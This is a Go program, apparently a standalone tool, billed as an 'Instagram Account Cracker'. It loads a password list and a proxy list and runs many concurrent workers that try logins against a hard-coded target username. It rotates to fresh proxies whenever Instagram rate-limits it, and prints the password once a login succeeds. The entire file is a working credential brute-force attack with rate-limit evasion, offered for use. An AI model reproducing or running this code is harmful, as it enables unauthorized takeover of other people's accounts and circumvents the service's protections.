package main

import (
	"bufio"
	"fmt"
	"net"
	"os"
	"strings"
	"sync"
	"time"

	"github.com/ahmdrz/goinsta"
)

const USERNAME string = "USERNAME_TO_HACK"
const WORKERS int = 25
const VERBOSE bool = false

var wg sync.WaitGroup
var hasProxyWarningOccurred bool = false
var passwords []string
var proxies []string
var cracked bool = false
var active int = WORKERS

func main() {

	// Print 'Welcome' banner
	welcomeMessage()

	// Load passwords and proxies into memory
	passwords, _ = readLines("passwords.txt")
	proxies, _ = readLines("proxies.txt")

	// Print 'Initialized' banner
	initializedMessage()

	for len(passwords) > 0 && !cracked {
		// Begin the cracking process
		crack()

		// Wait for all goroutines to complete
		wg.Wait()
	}

	// Mission failed. We'll get em' next time!
	failedMessage()
}

func welcomeMessage() {
	fmt.Println(`
|------------------------------------------|
|   BitBuster v1.0                         |
|   Instagram Account Cracker              |
|                                          |
|   Written and maintained by Peter Cunha  |
|   https://github.com/petercunha          |
|------------------------------------------|
		`)

	fmt.Println("BitBuster is initializing...")
}

func initializedMessage() {
	fmt.Println("\nTarget:", USERNAME)
	fmt.Println("Passwords:", len(passwords))
	fmt.Println("Proxies:", len(proxies))
	fmt.Println("Threads:", WORKERS)

	time.Sleep(time.Second * 1)
	fmt.Print("\nCracking will begin in 3 seconds (Ctrl+C to exit)  ")
	time.Sleep(time.Second * 1)
	fmt.Print("3")
	printDots()
	time.Sleep(time.Second * 1)
	fmt.Print("2")
	printDots()
	time.Sleep(time.Second * 1)
	fmt.Print("1")
	printDots()
	time.Sleep(time.Second * 1)
	fmt.Println("\nSpawning worker processes NOW!\n")
	time.Sleep(time.Second * 1)
}

func failedMessage() {
	fmt.Println("\n\nBitBuster was not able to crack the account. Sorry :(")
}

func printDots() {
	time.Sleep(time.Millisecond * 50)
	fmt.Print(".")
	time.Sleep(time.Millisecond * 50)
	fmt.Print(".")
	time.Sleep(time.Millisecond * 50)
	fmt.Print(". ")
}

func crack() {
	// Don't start more threads than one thread per password
	activatedWorkers := WORKERS
	if WORKERS > len(passwords) {
		activatedWorkers = len(passwords)
	}

	// Start the worker processes
	for i := 0; i < activatedWorkers; i++ {
		go workerThread(i)
	}
	go statusLoop()
}

func statusLoop() {
	for true {
		time.Sleep(time.Second * 10)
		fmt.Println()
		fmt.Println("<< STATUS UPDATE >>")
		fmt.Println("Passwords remaining:", len(passwords))
		fmt.Println("Proxies remaining:", len(proxies))
		fmt.Println("Active workers:", active)
		fmt.Println()
	}
}

func workerThread(workerNumber int) {
	// Add a task to the WaitGroup
	wg.Add(1)

	// Send worker finished signal on function exit
	defer wg.Done()

	// Pop a proxy off the slice
	proxy := pop(&proxies)

	// Worker startup message
	if VERBOSE {
		fmt.Println("Worker #", workerNumber, "started with proxy:", proxy)
	}

	// Begin cracking loop
	for len(passwords) > 0 && !cracked {

		// Pop a password off the slice
		password := pop(&passwords)

		// Test login informaton
		result := login(USERNAME, password, "http://"+proxy, workerNumber)

		if result == 0 {
			/*
			 *	Account cracked!
			 */
			fmt.Println("\n\nWorker #", workerNumber, "has cracked the account!")
			fmt.Println("Username:", USERNAME + "\n" +
									"Password:", password + "\n")
			os.Exit(0)
		} else if result == 2 {
			/*
			 *	Rate limit error occured!
			 */

			// Push last password back onto the stack.
			passwords = append(passwords, password)

			// Pull out a new proxy.
			proxy = pop(&proxies)

			// Loop until we get a valid proxy
			for !checkConn(proxy) {
				proxy = pop(&proxies)
				if proxy == "" {
					if VERBOSE {
						fmt.Println("Worker #", workerNumber, "is terminating prematurely due to lack of proxies.")
					}
					break
				}
			}

			if proxy == "" {
				if VERBOSE {
					fmt.Println("Worker #", workerNumber, "is terminating prematurely due to lack of proxies.")
				}
				break
			}

			// Worker proxy switch message
			if VERBOSE {
				fmt.Println("Worker #", workerNumber, "switching to new proxy:", proxy)
			}
		}
	}
	if VERBOSE {
		fmt.Println("Worker #", workerNumber, "has finished.")
	}
	active--
}

/*
 *   This function attempts to login to an instagram account
 *
 *	 Returns:
 *	 	0 for success
 *	 	1 for bad password
 *		2 for rate-limit or connection error
 */
func login(user string, pass string, proxy string, workerNumber int) int {

	//fmt.Println(user+":"+pass)

	insta := goinsta.NewViaProxy(user, pass, proxy)
	if err := insta.Login(); err != nil {
		// fmt.Println(err)
		if strings.Contains(err.Error(), `"error_type": "bad_password"`) {
			return 1
		}
		return 2
	}

	defer insta.Logout()

	cracked = true
	return 0
}

// Pops an element off a slice
func pop(slice *[]string) string {
	if len(*slice) == 0 {
		if !hasProxyWarningOccurred {
			fmt.Println("CRITICAL WARNING: Out of proxies!")
		}
		hasProxyWarningOccurred = true
		return ""
	}
	val := (*slice)[len(*slice)-1]
	*slice = (*slice)[:len(*slice)-1]
	return val
}

// readLines() reads a whole file into memory
// and returns a slice of its lines.
func readLines(path string) ([]string, error) {
	file, err := os.Open(path)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	var lines []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		lines = append(lines, scanner.Text())
	}
	return lines, scanner.Err()
}

// Checks if TCP conn. can be established to proxy
func checkConn(proxy string) bool {
	conn, err := net.Dial("tcp", proxy)

	if err != nil {
		return false
	} else {
		defer conn.Close()
		return true
	}
}
